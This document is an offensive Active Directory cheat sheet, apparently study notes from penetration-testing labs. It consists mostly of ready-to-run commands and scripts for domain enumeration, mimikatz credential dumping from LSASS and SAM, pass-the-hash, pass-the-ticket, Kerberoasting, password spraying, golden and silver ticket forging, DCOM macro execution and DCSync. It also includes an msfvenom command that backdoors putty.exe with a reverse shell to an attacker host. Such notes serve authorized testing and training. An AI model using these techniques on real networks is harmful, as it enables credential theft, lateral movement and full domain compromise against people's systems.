# Active Directory

## Net commands  

Local user accounts.  

`net user`  

All domain user accounts with /domain flag.  

`net user /domain`  

Display information about a specific user.  

`net user bob_admin /domain`  

Enumerate all groups on the domain.  

`net group /domain`  

## Users  

Powershell script to collect all users.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}

```

## Groups  

Get all members of administrator group.  

`Get-ADGroupMember -Identity administrators`  

Find if group is a member of another group.  

`Get-ADGroup 'service accounts' -Property memberof`  


## Nested groups  

Using the script to enumerate groups.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}
```  

The above script output can be enumrated for members that are groups (nested).  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(name=Secret_Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}

```  

## Logged on users  

Importing and using powerview to enumerate logged on users.  

```
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
```  

Get active sessions, in this case from domain controller.  

`Get-NetSession -ComputerName dc01`  


## Service principal names  

By enumerating spn, we can obtain ip and port numbers of applications running on servers integrated in the AD network, the output can then be used to resolve with nslookup.  
To search for http web servers.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```  
Enumerate all spn and get a service ticket in a format for john or hashcat.  

`Invoke-Kerberoast.ps1`  




## NTLM hash  

NTLM is used when authenticating to a server with an ip address rather than by hostname or if the AD DNS couldnt resolve a hostname.  



NTLM hashes from local SAM.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam

NTLM hashes from LSASS memory.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv

Using extracted hashes for pass the hash.

    mimikatz # token::revert
    mimikatz # sekurlsa::pth /user:elliot.alderson /domain:za.tryhackme.com /ntlm:654e4545455e5de /run:"some command"


## Extract hash password  

```
privilege::debug
lsadump::lsa /patch
```


## Pass the hash  

From pass-the-hash toolkit.  

`pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`  


RDP PTH

    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

psexec PTH

    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

WinRM PTH

    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH  
    
    
## Pass the ticket  


Pass-the-Ticket

    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export

The TGT can only be used on the machine it was created for, so the TGS has more potential and can be used across the network.  



Once the desired ticket has been extracted.

`mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`  

Backdoor .exe files.

`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`  

 ## Logged on users hashes from LSASS memory.  
 
 ```
 mimikatz.exe
 privilege::debug
 sekurlsa::logonpasswords
 ```  
 
 ## Cached credentials  
 
 Show tickets stored in memory.  
 
 `sekurlsa::tickets`  
 
 ## Service tickets  
 
 Requesting a service ticket.  
 
 ```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/theServer.evilcorp.com'
 ```  
List all tickets for current logged in user.  
 
 `klist`  
 
Save ticket to disk.  

`kerberos::list /export`  


 ## Kerberoasting  
 
 Using a wordlist and service granting ticket to brute force and guess a password (kerberoasting).  
 
 ```
 sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```  
 
 
## Password spraying  

Eiter set to -Pass for single password or -File for a wordlist. -Admin is for admin accounts.  

`.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`  


## Over pass the hash  

Run a application as another and then get the NTLM hash from memory.  

`sekurlsa::logonpasswords`  

Create a process without performing NTLM authentication over the network.  

`sekurlsa::pth /user:bob_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe`  

Then authenticate to a network share to get the ticket, any command could be used that requires domain permissions.  

`net use \\dc01`  

As PSExec.exe will only authenticate with a kerberos ticket and not a hashed password, we can now use it.  

`.\PsExec.exe \\dc01 cmd.exe`  


## Silver ticket  

Creating a ticket with a spn and any permissions we desire. The password must be hashed, if it is in clear text then it needs to be hashed first.  

Obtain the SID of the current user, only the domain identifier from the SID is needed, which is everything apart from the last -XXXX (RID).  

`whoami /user`  

Flush out existing tickets, check it has completed then create a silver ticket, /target is fully qualified name and /ptt is to inject it into memory.  

```
kerberos::purge
kerberos::list
kerberos::golden /user:bob /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:myWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
 
Check it has been created.  

`kerberos::list`  

## Golden ticket  

When a TGT is requested, the KDC encrypts it with a secret key which is the hashed password of the krbtgt account. If the hashed password is known, it can be used to create a custom TGT (golden ticket). A ticket can be created without administrative rights and its also possible on a machine that is not domain joined.  

Delete existing tickets.  

`kerberos::purge`  

Get domain SID.  

`whoami /user`  

Create golden ticket.  

```
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```  

Then launch a new command prompt to laterally move into with something like PSExec.  

`misc::cmd`  

NOTE: The golden ticket attack needs the domain name to access it with PSExec as using the ip will force NTLM authentication as is the same with over pass the hash.

## Distributed Component Object Model (DCOM)  

DCOM is a system that is created for software components to interact with eachother over the network.  

Using powershell, find out members and sub-objects of the DCOM object, which in this case is an excel object.  

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$com | Get-Member
```  

Using the run method that executes a VBA script remotely, a poc VBA script can be created that executes notepad. The file is saved in legacy format .xsl

```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```  

Copy an Excel document to a remote machine, overwriting if it exists.  

```
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```  

Create a directory so the application can have a profile to use for opening.  

```
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
```  

Open the application.  

```
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
```  

Call the run method to pop notepad.  

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```  

## Lateral movement  

Using PSexec to move to the domain controller.  

`psexec.exe \\dc01 cmd.exe`  

## Domain controller synchronization  

To steal all administrative passwords:
- Move laterally to domain controller and dump with mimikatz
- Steal NTDS.dit, which is a copy of all AD accounts on the disk.
- Use Directory Replication Service Remote Protocol, which is a replication function within AD because there is usually more than one domain controller in production. A approriate SID is required for this, not another DC.

Logged in as a domain administrator and using mimikatz.  

`lsadump::dcsync /user:Administrator`  

With the above hashes we can request a sync without ever logging into the DC.


## Windows Management Instrumentation  

## Powershell Remoting  

